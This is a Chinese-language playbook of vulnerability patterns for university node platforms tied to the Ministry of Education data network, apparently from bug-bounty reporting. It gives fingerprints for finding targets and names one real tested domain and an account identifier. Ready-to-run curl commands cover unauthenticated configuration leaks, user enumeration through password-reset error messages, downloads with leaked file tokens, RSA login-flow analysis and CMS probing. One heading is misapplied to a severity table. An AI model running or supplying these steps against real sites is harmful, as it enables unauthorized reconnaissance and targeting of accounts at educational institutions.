# 教育部数据网络高校节点平台 API 漏洞模式

适用场景：域名含 edu，Vue.js SPA 标题含"节点系统"或"数据采集"，API 连接 `data.moe.edu.cn`。

## 平台指纹

- 标题：`节点系统`
- JS 路径：`/page/assets/index-*.js`（Vue.js SPA）
- 外部连接：`https://data.moe.edu.cn/qualitym/api/file/down`、`https://data.moe.edu.cn/newservice/api/login/account-moe`
- 响应头：`Server: nginx`
- 站点配置 API 返回 `web_name` 含"教育部数据网络"或"节点"

## 关键发现（2026-06-08 xjjtedu.com）

### 1. API 基路径发现

SPA 在 `/page/`，但 API 在根路径 `/api/` 和 `/site/`、`/system/`，不在 `/page/api/`。

测试顺序：
```
curl -sk 'https://TARGET/api/site/info'           # 站点配置（无需认证）
curl -sk 'https://TARGET/page/api/site/info'       # 404 或 SPA fallback
curl -sk 'https://TARGET/api/login/cpk'            # RSA 公钥泄露
curl -sk 'https://TARGET/api/site/getConfig?type=UI_SWITCH'
```

### 2. 未授权 API 端点（无需登录）

| 端点 | 返回内容 | 风险 |
|------|---------|------|
| `/api/site/info` | 站点配置、depart_sn、文件下载令牌 | 信息泄露 → 用户枚举链 |
| `/api/site/getConfig?type=*` | UI 配置（多数为空） | 低 |
| `/api/login/cpk` | RSA 公钥 + CN 标识 | 低 |
| `/api/site/dict-detail?id=N` | 字典详情（需 id） | IDOR 候选 |
| `/api/file/down?token=TOKEN` | S3 文件下载 | 文件泄露 |

### 3. 密码重置参数枚举技术

端点 `/api/login/resetting-pwd` 接受 form-encoded POST。

参数发现过程（通过错误信息逐步暴露）：
1. `username=admin` → `{"e":"PARAM_ERROR","m":"参数错误","d":{"param":"password"}}`
2. `username=admin&password=x` → `{"e":"PARAM_ERROR","m":"参数错误","d":{"param":"res_password"}}`
3. `username=admin&password=x&res_password=x` → `{"e":"ERROR","m":"新密码不能与旧密码相同"}`
4. `username=admin&password=x&res_password=y` → `{"e":"CODE_ERROR","m":"Attempt to read property \"first_rest_passwd\" on null Login:170"}`

### 4. 用户枚举（通过密码重置错误差异）

| 用户状态 | 错误信息 |
|---------|---------|
| 不存在 | `Attempt to read property "first_rest_passwd" on null Login:170` |
| 存在 | `只允许首次登录重置密码` |

关键：`depart_sn`（从 `/api/site/info` 获取）通常是有效用户名。

复现：
```bash
# 不存在的用户
curl -s -X POST -d 'username=nonexistent&password=New123&res_password=Old456' \
  'https://TARGET/api/login/resetting-pwd'

# 存在的用户（depart_sn）
curl -s -X POST -d 'username=4165013926&password=New123&res_password=Old456' \
  'https://TARGET/api/login/resetting-pwd'
```

### 5. 文件令牌泄露链

1. 从 `/api/site/info` 获取 `site_logo` 和 `brow_logo` 的 token
2. 用 `curl -sk -D- 'https://TARGET/api/file/down?token=TOKEN&view=1'` 下载
3. 响应头含 `X-Amz-Id-2` / `X-Amz-Request-Id` 确认 S3 存储

### 6. 登录端点行为与 RSA 加密流程

`/api/login/account` 始终返回 `参数不足`，无论 JSON 或 form-encoded。

**RSA 加密流程**（从 JS bundle 分析得出）：
1. GET `/api/login/cpk` → 返回 `{cn: "session_id", pk: "RSA_PUBLIC_KEY"}`
2. 用 RSAES-PKCS1-V1_5 加密密码，Base64 编码
3. POST `/api/login/account` with `{username, password: base64(encrypted), cn}`

**注意**：CN 值每次请求变化（动态会话标识），可能需要在同一会话中完成 cpk→login 流程。

### 7. Vue.js SPA JS Bundle 分析技术

当需要理解前端登录/加密流程时：

```bash
# 下载主 bundle（通配符匹配）
curl -sk 'https://TARGET/page/assets/index-*.js' -o /tmp/spa_main.js

# 搜索 API 映射对象（通常是 key→URL 的映射）
grep -oP 'loginAccount[^,]*' /tmp/spa_main.js
grep -oP '"[^"]*":\s*"/api/[^"]*"' /tmp/spa_main.js | head -50

# 搜索加密相关代码
grep -oP 'encrypt|JSEncrypt|RSA|setPublicKey' /tmp/spa_main.js | sort -u

# 搜索请求拦截器
grep -oP 'interceptors\.[a-z]+\.use' /tmp/spa_main.js
```

**关键发现**（xjjtedu.com）：
- API 映射对象 `Ez` 包含所有端点映射（loginAccount → /api/login/account）
- `Az(key)` 函数通过 `Ez` 对象将 key 转换为实际 URL
- 请求拦截器添加 `sign-key` header 和 `__REPEAT__` URL 后缀
- `DK` 参数用于请求去重（可能与会话绑定）
- RSA 加密使用 forge 库的 `pki.publicKeyFromPem().encrypt()` 方法

### 8. 博达CMS (Visual SiteBuilder) 模式

主域常见指纹：
- Server: VAppServer/6.0.0（在 301 重定向响应中泄露）
- JSP 端点：`/ss.jsp`, `/list.jsp`, `/system/_content/download.jsp`
- 下载端点：`/system/_content/download.jsp?owner=ID&wbfileid=ID`
- 验证码：`/system/resource/js/filedownload/createimage.jsp`

```bash
# 检测 VAppServer 版本
curl -sk -D- 'http://TARGET/system/' | grep Server

# 测试 JSP 端点
curl -sk 'http://TARGET/ss.jsp?id=1'
curl -sk 'http://TARGET/system/_content/download.jsp'
```

## 通用复现命令

| 漏洞 | 等级 | 可提交 | 理由 |
|------|------|--------|------|
| 用户枚举 + PHP 源码泄露 | 中危 | ✓ | 有实际攻击价值，源码泄露降低后续攻击成本 |
| 站点配置信息泄露 | 低危 | ✓ | 泄露 depart_sn 可串联用户枚举 |
| 文件令牌泄露 | 低危 | △ | 当前只泄露 Logo，需确认是否有敏感文件 |
| RSA 公钥泄露 | 低危 | ✗ | 公钥本身不敏感 |

## 通用复现命令

```bash
# 站点配置
curl -s 'https://TARGET/api/site/info'

# 用户枚举（不存在）
curl -s -X POST -d 'username=nonexistent123&password=NewPass123&res_password=OldPass456' \
  'https://TARGET/api/login/resetting-pwd'

# 用户枚举（存在）
curl -s -X POST -d 'username=DEPART_SN&password=NewPass123&res_password=OldPass456' \
  'https://TARGET/api/login/resetting-pwd'

# 文件下载
curl -s -D- 'https://TARGET/api/file/down?token=LEAKED_TOKEN&view=1'

# CPK
curl -s 'https://TARGET/api/login/cpk'
```
